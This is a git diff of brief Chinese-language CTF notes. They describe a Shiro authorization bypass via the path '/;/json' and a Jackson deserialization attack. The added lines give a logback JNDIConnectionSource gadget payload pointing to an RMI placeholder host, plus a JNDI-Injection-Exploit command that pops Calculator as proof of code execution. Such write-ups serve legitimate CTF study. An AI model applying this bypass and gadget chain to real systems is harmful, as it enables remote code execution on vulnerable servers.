@@ -29,7 +29,15 @@
 #shiro
 shiro权限绕过`/;/json`
 
-发现回显理由jackson,猜测反序列化漏洞,在`D:\CTF_TOO
+发现回显理由jackson,猜测反序列化漏洞,在`D:\CTF_Tools\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`里有利用工具
+验证是否存在
+```bash
+["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"rmi://ip:port/test"}]
+```
+
+```bash
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"
+```
 
 
 
